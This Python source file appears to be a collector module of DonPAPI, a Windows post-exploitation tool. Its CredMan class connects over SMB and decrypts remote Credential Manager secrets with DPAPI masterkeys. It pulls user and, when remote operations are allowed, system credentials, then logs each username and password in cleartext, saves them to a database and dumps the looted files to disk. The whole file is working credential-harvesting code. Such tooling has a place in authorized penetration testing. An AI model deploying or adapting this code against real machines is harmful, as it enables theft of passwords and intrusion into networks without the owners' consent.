from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.credentials import CredentialsTriage
from dploot.lib.utils import dump_looted_files_to_disk
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


class CredMan:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        self.logger.display(f"Dumping User{' and Machine' if self.context.remoteops_allowed else ''} Credential Manager")
        def credman_callback(credential):
            self.logger.secret(f"[{credential.winuser}] {credential.target} - {credential.username}:{credential.password}", self.tag)
            self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user=credential.winuser, username=credential.username.rstrip("\x00"), password=credential.password.rstrip("\x00"), target=credential.target.rstrip("\x00"))
        credentials_triage = CredentialsTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys, per_credential_callback=credman_callback)
        credentials_triage.triage_credentials()
        if self.context.remoteops_allowed:
            credentials_triage.triage_system_credentials()
        
        dump_looted_files_to_disk(self.context.target_output_dir, credentials_triage.looted_files)